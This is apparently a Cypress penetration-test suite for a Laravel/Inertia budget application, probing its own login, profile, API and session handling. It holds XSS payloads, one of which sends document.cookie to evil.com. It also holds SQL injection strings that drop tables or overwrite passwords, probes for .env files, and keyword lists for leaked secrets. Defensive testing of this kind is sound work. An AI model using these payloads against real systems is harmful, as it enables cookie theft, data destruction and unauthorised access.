// Advanced Security Penetration Tests using Cypress
// This test suite covers sophisticated attack vectors and edge cases
// including XSS variants, advanced SQL injection, session hijacking, and more

describe("Advanced Security Penetration Testing", () => {
    const loginPage = "/login";
    const apiEndpoints = ["/api/users", "/api/admin", "/api/data"];

    beforeEach(() => {
        cy.visit(loginPage);
    });

    // Test 1: Advanced XSS Attacks
    describe("Advanced XSS Vulnerability Tests", () => {
        it("should prevent DOM-based XSS attacks", () => {
            const domXssPayloads = [
                'javascript:alert("DOM-XSS")',
                '"><img src=x onerror=alert("XSS")>',
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                '"><svg/onload=alert("XSS")>',
                'data:text/html,<script>alert("XSS")</script>',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
            ];

            domXssPayloads.forEach((payload) => {
                cy.get('input[type="email"], input[name="email"], input#email')
                    .first()
                    .clear()
                    .type(payload);

                cy.get(
                    'input[type="password"], input[name="password"], input#password'
                )
                    .first()
                    .clear()
                    .type("test123");

                cy.contains("Iniciar Sesión").click();

                // Check that payload is not executed and properly escaped
                cy.get("body").should("not.contain", payload);

                // Check for XSS execution indicators instead of all script tags
                cy.window().then((win) => {
                    // Check if any malicious alerts were triggered
                    expect(win.document.title).to.not.contain("XSS");

                    // Verify the payload appears as text, not executed code
                    // Check that the input contains the payload (may be sanitized)
                    cy.get('input[type="email"]').should(($input) => {
                        const actualValue = $input.val();

                        // Check for payload-specific content instead of hardcoded strings
                        if (payload.includes("img")) {
                            expect(actualValue).to.include("img");
                        }
                        if (payload.includes("onerror")) {
                            expect(actualValue).to.include("onerror");
                        }
                        if (payload.includes("javascript:")) {
                            expect(actualValue).to.include("javascript:");
                        }

                        // The payload should be sanitized or the same (but not executed)
                        expect(actualValue).to.not.be.empty;
                    });
                });

                // Check that no new malicious script tags were injected
                cy.get("script").should("not.contain.text", "alert");
                cy.get("script").should("not.contain.text", "XSS");
            });
        });

        it("should prevent stored XSS in profile fields", () => {
            // Try to inject XSS in various profile fields if accessible
            const storedXssPayloads = [
                '<script>document.cookie="stolen="+document.cookie;</script>',
                '"><iframe src="javascript:alert(\'Stored XSS\')">',
                '<img src="" onerror="this.src=\'http://evil.com/steal?\'+document.cookie">',
            ];

            cy.visit("/profile", { failOnStatusCode: false });

            storedXssPayloads.forEach((payload) => {
                cy.get("input, textarea").each(($input) => {
                    if (
                        $input.is(":visible") &&
                        !$input.is('[type="checkbox"]') &&
                        !$input.is('[type="radio"]') &&
                        !$input.is('[type="file"]')
                    ) {
                        cy.wrap($input).clear().type(payload);
                    }
                });
            });
        });
    });

    // Test 2: Advanced SQL Injection
    describe("Advanced SQL Injection Tests", () => {
        it("should prevent blind SQL injection attacks", () => {
            const blindSqlPayloads = [
                "admin' AND (SELECT COUNT(*) FROM users) > 0 AND '1'='1",
                "admin'; WAITFOR DELAY '00:00:05'--",
                "admin' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64--",
                "admin' UNION SELECT null,null,version()--",
                "admin'; DROP TABLE users; --",
                "admin' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'--",
            ];

            blindSqlPayloads.forEach((payload) => {
                const startTime = Date.now();

                cy.get('input[type="email"], input[name="email"], input#email')
                    .first()
                    .clear()
                    .type(payload);

                cy.get(
                    'input[type="password"], input[name="password"], input#password'
                )
                    .first()
                    .should("not.be.disabled")
                    .clear()
                    .type("test");

                cy.contains("Iniciar Sesión").click();

                const endTime = Date.now();
                const responseTime = endTime - startTime;

                // Check for time-based injection indicators
                if (responseTime > 5000) {
                    cy.log(
                        `WARNING: Potential time-based SQL injection detected. Response time: ${responseTime}ms`
                    );
                }

                cy.url().should("include", loginPage);
            });
        });

        it("should prevent second-order SQL injection", () => {
            // Register with malicious payload, then try to trigger it
            const secondOrderPayload =
                "admin'; UPDATE users SET role='admin' WHERE id=1--";

            cy.visit("/register", { failOnStatusCode: false });

            // Check if register page exists, if not skip this test
            cy.get("form").then(($form) => {
                if (
                    $form.find('input[name="username"], input[name="email"]')
                        .length > 0
                ) {
                    cy.get('input[name="username"], input[name="email"]')
                        .first()
                        .type(secondOrderPayload);
                    cy.get('input[type="password"]')
                        .first()
                        .type("password123");
                    cy.get('button[type="submit"]').click();

                    // Verify the payload was not executed - should stay on register page or show error
                    cy.url().should("not.include", "/dashboard");
                    cy.url().should("not.include", "/admin");

                    // Check that no SQL injection occurred by verifying safe behavior
                    cy.get("body").should("not.contain", "SQL syntax error");
                    cy.get("body").should("not.contain", "mysql error");
                } else {
                    cy.log(
                        "Register page not available - skipping second-order SQL injection test"
                    );
                }
            });
        });
    });

    // Test 3: Session Hijacking and Fixation
    describe("Session Security Tests", () => {
        it("should regenerate session ID after login", () => {
            let sessionIdBefore, sessionIdAfter;

            // Capture session ID before login - CORREGIDO para Laravel
            cy.getCookie("laravel_session").then((cookie) => {
                sessionIdBefore = cookie ? cookie.value : null;
            });

            // Perform login
            cy.get('input[type="email"]').first().type("test@example.com");
            cy.get('input[type="password"]').first().type("password123");
            cy.contains("Iniciar Sesión").click();

            // Capture session ID after login - CORREGIDO para Laravel
            cy.getCookie("laravel_session").then((cookie) => {
                sessionIdAfter = cookie ? cookie.value : null;

                if (sessionIdBefore && sessionIdAfter) {
                    expect(sessionIdBefore).to.not.equal(sessionIdAfter);
                    cy.log("PASS: Session ID regenerated after login");
                } else {
                    cy.log("WARNING: Could not verify session ID regeneration");
                }
            });
        });

        it("should have secure session cookie attributes", () => {
            // Primero hacer login para generar cookies válidas
            cy.get('input[type="email"]').first().type("test@example.com");
            cy.get('input[type="password"]').first().type("password123");
            cy.contains("Iniciar Sesión").click();

            cy.getCookies().then((cookies) => {
                let foundSessionCookie = false;

                cookies.forEach((cookie) => {
                    // CORREGIDO: Buscar cookies de Laravel específicamente
                    if (
                        cookie.name === "laravel_session" ||
                        cookie.name.includes("budget_app_session")
                    ) {
                        foundSessionCookie = true;

                        // En desarrollo local, secure puede estar en false
                        if (Cypress.env("NODE_ENV") === "production") {
                            expect(cookie.secure).to.be.true;
                        } else {
                            // En desarrollo, solo logueamos el estado
                            cy.log(
                                `Cookie ${cookie.name} secure: ${cookie.secure} (development mode)`
                            );
                        }

                        expect(cookie.httpOnly).to.be.true;
                        expect(cookie.sameSite).to.be.oneOf([
                            "strict",
                            "lax",
                            "none",
                        ]);
                        cy.log(
                            `Session cookie ${cookie.name} has secure attributes`
                        );
                    }
                });

                // Verificar que encontramos al menos una cookie de sesión
                expect(foundSessionCookie).to.be.true;
            });
        });
    });

    // Test 4: Advanced Authentication Bypass
    describe("Advanced Authentication Bypass Tests", () => {
        it("should prevent session cookie manipulation", () => {
            // CORREGIDO: Usar nombres de cookies de Laravel
            const maliciousCookies = [
                { name: "laravel_session", value: "admin_session_id" },
                { name: "XSRF-TOKEN", value: "manipulated_token" },
                { name: "auth_session", value: "eyJhZG1pbiI6dHJ1ZX0=" },
            ];

            maliciousCookies.forEach((cookie) => {
                cy.setCookie(cookie.name, cookie.value);

                cy.visit("/admin", { failOnStatusCode: false });
                cy.url().should("not.include", "/admin");

                // Clean up
                cy.clearCookie(cookie.name);
            });
        });

        it("should prevent privilege escalation through cookie modification", () => {
            // First login as regular user
            cy.get('input[type="email"]').first().type("user@example.com");
            cy.get('input[type="password"]').first().type("password123");
            cy.contains("Iniciar Sesión").click();

            // Try to modify cookies to escalate privileges
            cy.getCookies().then((cookies) => {
                cookies.forEach((cookie) => {
                    // Try to modify existing cookies
                    const maliciousValues = [
                        cookie.value + "&admin=true",
                        cookie.value.replace("user", "admin"),
                        "admin_" + cookie.value,
                    ];

                    maliciousValues.forEach((value) => {
                        cy.setCookie(cookie.name, value);
                        cy.visit("/admin", { failOnStatusCode: false });
                        cy.url().should("not.include", "/admin");
                    });
                });
            });
        });

        it("should prevent parameter pollution attacks", () => {
            // Test parameter pollution in login
            cy.request({
                method: "POST",
                url: "/login",
                body: "email=user@example.com&email=admin@example.com&password=test&password=admin",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.not.equal(200);
            });
        });
    });

    // Test 6: API Security Tests
    describe("API Security Penetration Tests", () => {
        it("should prevent API mass assignment attacks", () => {
            const massAssignmentPayloads = [
                { role: "admin", is_admin: true },
                { password: "hacked", email_verified_at: new Date() },
                { user_type: "admin", permissions: ["all"] },
                { status: "active", credit_limit: 999999 },
            ];

            massAssignmentPayloads.forEach((payload) => {
                cy.request({
                    method: "POST",
                    url: "/api/profile",
                    body: payload,
                    failOnStatusCode: false,
                }).then((response) => {
                    // Should reject mass assignment attempts
                    expect(response.status).to.be.oneOf([
                        400, 401, 403, 405, 422,
                    ]);

                    if (response.body && response.body.errors) {
                        cy.log(
                            "Mass assignment properly blocked with validation errors"
                        );
                    }
                });
            });
        });

        it("should prevent Inertia props injection", () => {
            // Test for Inertia-specific vulnerabilities
            cy.request({
                method: "GET",
                url: "/budgets",
                headers: {
                    "X-Inertia": "true",
                    "X-Inertia-Version": "malicious-version",
                },
                failOnStatusCode: false,
            }).then((response) => {
                if (response.status === 200 && response.body) {
                    // Verify Inertia response doesn't expose sensitive data
                    const responseBody =
                        typeof response.body === "string"
                            ? JSON.parse(response.body)
                            : response.body;

                    if (responseBody.props) {
                        // Check that sensitive props are not exposed
                        expect(responseBody.props).to.not.have.property(
                            "password"
                        );
                        expect(responseBody.props).to.not.have.property(
                            "secret_key"
                        );
                        expect(responseBody.props).to.not.have.property(
                            "api_token"
                        );
                    }
                }
            });
        });

        it("should prevent API enumeration attacks", () => {
            // Test for information disclosure in API responses
            for (let i = 1; i <= 10; i++) {
                cy.request({
                    method: "GET",
                    url: `/api/users/${i}`,
                    failOnStatusCode: false,
                }).then((response) => {
                    if (response.status === 200) {
                        expect(response.body).to.not.have.property("password");
                        expect(response.body).to.not.have.property("ssn");
                        expect(response.body).to.not.have.property(
                            "credit_card"
                        );
                    }
                });
            }
        });
    });

    // Test 7: Business Logic Flaws
    describe("Business Logic Vulnerability Tests", () => {
        it("should prevent race condition attacks", () => {
            // Simulate concurrent requests to exploit race conditions
            const responses = [];

            // Execute requests sequentially and collect responses
            for (let i = 0; i < 5; i++) {
                cy.request({
                    method: "POST",
                    url: "/api/transfer",
                    body: { amount: 1000, to: "attacker" },
                    failOnStatusCode: false,
                }).then((response) => {
                    responses.push(response);
                });
            }

            // Verify the responses after all requests complete
            cy.then(() => {
                if (responses.length > 0) {
                    const successCount = responses.filter(
                        (r) => r && r.status === 200
                    ).length;
                    expect(successCount).to.be.lessThan(2);
                    cy.log(`Race condition test: ${successCount} successful requests out of ${responses.length}`);
                } else {
                    cy.log("No responses collected - endpoint may not exist");
                }
            });
        });

        it("should prevent price manipulation attacks", () => {
            // Try to manipulate prices in requests
            cy.request({
                method: "POST",
                url: "/api/purchase",
                body: {
                    item: "premium_service",
                    price: 0.01,
                    originalPrice: 99.99,
                },
                failOnStatusCode: false,
            }).then((response) => {
                expect(response.status).to.not.equal(200);
            });
        });
    });

    // Test 8: Advanced CSRF and Clickjacking
    describe("Advanced UI Security Tests", () => {
        it("should prevent clickjacking attacks", () => {
            cy.request("/").then((response) => {
                const xFrameOptions = response.headers["x-frame-options"];
                const csp = response.headers["content-security-policy"];

                // Verificar que existe protección contra clickjacking
                const hasClickjackProtection =
                    (xFrameOptions &&
                        (xFrameOptions === "DENY" ||
                            xFrameOptions === "SAMEORIGIN")) ||
                    (csp && csp.includes("frame-ancestors"));

                if (!hasClickjackProtection) {
                    cy.log("WARNING: No clickjacking protection found");
                    cy.log(`X-Frame-Options: ${xFrameOptions}`);
                    cy.log(`CSP: ${csp}`);
                }

                // En desarrollo, puede que no esté configurado
                if (Cypress.env("NODE_ENV") === "production") {
                    expect(hasClickjackProtection).to.be.true;
                } else {
                    cy.log(
                        "Clickjacking protection check skipped in development"
                    );
                }
            });
        });

        it("should prevent CSRF with custom headers", () => {
            // Probar múltiples endpoints que pueden existir
            const sensitiveEndpoints = [
                "/api/sensitive-action",
                "/admin/action",
                "/user/profile",
                "/api/transfer",
            ];

            sensitiveEndpoints.forEach((endpoint) => {
                cy.request({
                    method: "POST",
                    url: endpoint,
                    headers: {
                        "Content-Type": "text/plain",
                        "X-Requested-With": "XMLHttpRequest",
                    },
                    body: "malicious=data",
                    failOnStatusCode: false,
                }).then((response) => {
                    // Aceptar más códigos de error válidos
                    expect(response.status).to.be.oneOf([
                        401, 403, 400, 404, 405, 419, 422,
                    ]);

                    if (response.status === 404) {
                        cy.log(`Endpoint ${endpoint} not found - OK`);
                    } else if (response.status === 405) {
                        cy.log(`Method not allowed for ${endpoint} - OK`);
                    } else if (response.status === 419) {
                        cy.log(`CSRF token mismatch for ${endpoint} - GOOD`);
                    }
                });
            });
        });
    });

    describe("Information Disclosure Tests", () => {
        it("should not expose sensitive information in errors", () => {
            const sensitiveEndpoints = [
                "/api/config",
                "/admin/debug",
                "/.env",
                "/phpinfo.php",
                "/server-status",
                "/api/internal",
            ];

            sensitiveEndpoints.forEach((endpoint) => {
                cy.request({
                    url: endpoint,
                    failOnStatusCode: false,
                }).then((response) => {
                    // Solo verificar endpoints que realmente existen y no son redirects
                    if (response.status === 200 && response.body) {
                        const responseText =
                            typeof response.body === "string"
                                ? response.body.toLowerCase()
                                : JSON.stringify(response.body).toLowerCase();

                        // Verificar solo si NO es la página normal de la aplicación
                        const isNormalAppPage =
                            responseText.includes(
                                "<title inertia>budget_app</title>"
                            ) ||
                            responseText.includes("laravel pwa") ||
                            responseText.includes("ziggy=") ||
                            responseText.includes('"component":"auth');

                        if (!isNormalAppPage) {
                            // Solo entonces verificar información sensible
                            const reallyForbiddenKeywords = [
                                "db_password=",
                                "app_key=",
                                "mysql_password=",
                                "redis_password=",
                                "mail_password=",
                                "database_url=",
                                "secret_key=",
                                "private_key=",
                                "api_secret=",
                                "jwt_secret=",
                                // Información específica de configuración PHP
                                "mysql.default_password",
                                "mysqli.default_password",
                                "session.save_path",
                                // Stack traces reales
                                "call stack",
                                "fatal error",
                                "uncaught exception",
                                "file not found",
                                "access denied for user",
                            ];

                            reallyForbiddenKeywords.forEach((keyword) => {
                                if (responseText.includes(keyword)) {
                                    cy.log(
                                        `❌ SECURITY ISSUE: Found sensitive keyword '${keyword}' in ${endpoint}`
                                    );
                                    expect(responseText).to.not.include(
                                        keyword
                                    );
                                }
                            });

                            cy.log(
                                `✅ Endpoint ${endpoint} checked - no sensitive data exposed`
                            );
                        } else {
                            cy.log(
                                `ℹ️  Endpoint ${endpoint} returned normal app page - OK`
                            );
                        }
                    } else if (response.status === 404) {
                        cy.log(
                            `✅ Endpoint ${endpoint} not found (404) - GOOD`
                        );
                    } else if (response.status === 403) {
                        cy.log(
                            `✅ Endpoint ${endpoint} forbidden (403) - GOOD`
                        );
                    } else {
                        cy.log(
                            `ℹ️  Endpoint ${endpoint} returned ${response.status} - Safe`
                        );
                    }
                });
            });
        });
    });

    // Test 10: Advanced Timing Attacks
    describe("Timing Attack Tests", () => {
        it("should not be vulnerable to timing attacks on authentication", () => {
            const timings = [];
            const validUser = "admin@example.com";
            const invalidUser = "nonexistent@example.com";

            // Test with valid user - chain requests properly
            let validTimings = [];
            let invalidTimings = [];

            // Measure timing for valid user requests
            for (let i = 0; i < 5; i++) {
                cy.then(() => {
                    const start = Date.now();
                    cy.request({
                        method: "POST",
                        url: "/login",
                        body: { email: validUser, password: "wrongpassword" },
                        failOnStatusCode: false,
                    }).then(() => {
                        const end = Date.now();
                        validTimings.push(end - start);
                    });
                });
            }

            // Measure timing for invalid user requests
            for (let i = 0; i < 5; i++) {
                cy.then(() => {
                    const start = Date.now();
                    cy.request({
                        method: "POST",
                        url: "/login",
                        body: { email: invalidUser, password: "wrongpassword" },
                        failOnStatusCode: false,
                    }).then(() => {
                        const end = Date.now();
                        invalidTimings.push(end - start);
                    });
                });
            }

            // Analyze timing differences after all requests complete
            cy.then(() => {
                if (validTimings.length > 0 && invalidTimings.length > 0) {
                    const validAvg =
                        validTimings.reduce((a, b) => a + b, 0) /
                        validTimings.length;
                    const invalidAvg =
                        invalidTimings.reduce((a, b) => a + b, 0) /
                        invalidTimings.length;
                    const timingDifference = Math.abs(validAvg - invalidAvg);

                    // Should not have significant timing differences
                    expect(timingDifference).to.be.lessThan(1000); // Less than 1000ms difference
                    cy.log(
                        `Valid user avg: ${validAvg}ms, Invalid user avg: ${invalidAvg}ms, Difference: ${timingDifference}ms`
                    );
                } else {
                    cy.log("WARNING: Could not collect timing data");
                }
            });
        });
    });
});
